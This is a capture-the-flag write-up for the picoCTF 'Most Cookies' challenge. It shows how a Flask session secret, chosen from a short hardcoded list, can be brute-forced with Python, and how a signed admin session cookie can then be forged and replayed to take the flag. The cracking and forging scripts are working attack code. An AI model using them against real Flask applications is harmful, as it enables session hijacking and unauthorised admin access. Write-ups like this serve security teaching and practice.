<hr />

<h2>description: 'Flask client-side sessions, cookie forgery'</h2>

<h1>Most Cookies (150)</h1>

<h2>Problem</h2>

<p>Alright, enough of using my own encryption. Flask session cookies should be plenty secure! <a href="https://mercury.picoctf.net/static/99a50920a248ec37c39b8e3ab0af8789/server.py">server.py</a></p>

<p>{% embed url="http://mercury.picoctf.net:18835" %}</p>

<h2>Solution</h2>

<p>From the source code, things to note:</p>

<p>1) The /display page checks the session cookie. We need to change the <code>very_auth</code> session variable to <code>admin</code> somehow.</p>

<p><img src="../../.gitbook/assets/93b4e2f47ebf4169b2951b4ea172732e.png" alt="" /></p>

<p>2) The Flask session secret key is hardcoded into the source code!</p>

<p><code>python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
</code></p>

<p>We can decode the Flask session cookie like this:</p>

<p>1) Take the part before the period (<code>.</code>)</p>

<p><img src="../../.gitbook/assets/ef9046c48d2a4f77bbbda919dcc567e4.png" alt="" /></p>

<p>2) Append the <code>==</code> padding</p>

<p>3) Base64 decode:</p>

<p>```python</p>

<blockquote>
  <blockquote>
    <blockquote>
      <p>base64.urlsafe<em>b64decode('eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0==')
      b'{"very</em>auth":"snickerdoodle"}'
      ```</p>
    </blockquote>
  </blockquote>
</blockquote>

<p>So we can change the session variable to <code>admin</code> and encode it again, but first, we need to crack the secret key. This is because the remainder of the session cookie is the <strong>signature</strong> which will be checked at the server-side to prevent tampering.</p>

<p>The following script will bruteforce each secret in the wordlist:</p>

<p>```python
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer</p>

<p>wordlist = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]</p>

<p>cookie<em>str="eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YF7u-Q.G5B5RUmEVaXNyLzjitMwzPxALp4"
def decode</em>flask<em>cookie(secret</em>key, cookie<em>str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer</em>kwargs = {
        'key<em>derivation': 'hmac',
        'digest</em>method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret<em>key, serializer=serializer, salt=salt, signer</em>kwargs = signer<em>kwargs)
    return s.loads(cookie</em>str)</p>

<p>for secret<em>key in wordlist:
    try:
        cookie = decode</em>flask<em>cookie(secret</em>key, cookie_str)
    except:
        continue</p>

<pre><code>print(secret_key)
print(cookie)
</code></pre>

<p>```</p>

<p>Here, the secret key is <code>'butter'</code>.</p>

<p><img src="../../.gitbook/assets/3fc8cd43608949f6b5186a7a9ed353a7.png" alt="" /></p>

<p>With the secret key, we can craft our own session cookie:</p>

<p>```python
import hashlib
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from flask.sessions import TaggedJSONSerializer</p>

<p>session = {'very_auth': 'admin'}
secret = 'butter'</p>

<p>print(URLSafeTimedSerializer(
    secret<em>key = secret,
    salt = 'cookie-session',
    serializer = TaggedJSONSerializer(),
    signer = TimestampSigner,
    signer</em>kwargs={
        'key<em>derivation': 'hmac',
        'digest</em>method': hashlib.sha1
    }
).dumps(session))
```</p>

<p><img src="../../.gitbook/assets/2e06021675f04f98896b554384cd1678.png" alt="" /></p>

<p>Putting this new crafted cookie back into Burpsuite, we get the flag in the response.</p>

<p><img src="../../.gitbook/assets/c61a8cc65a8942c6990ee65ccf80cc71.png" alt="" /></p>
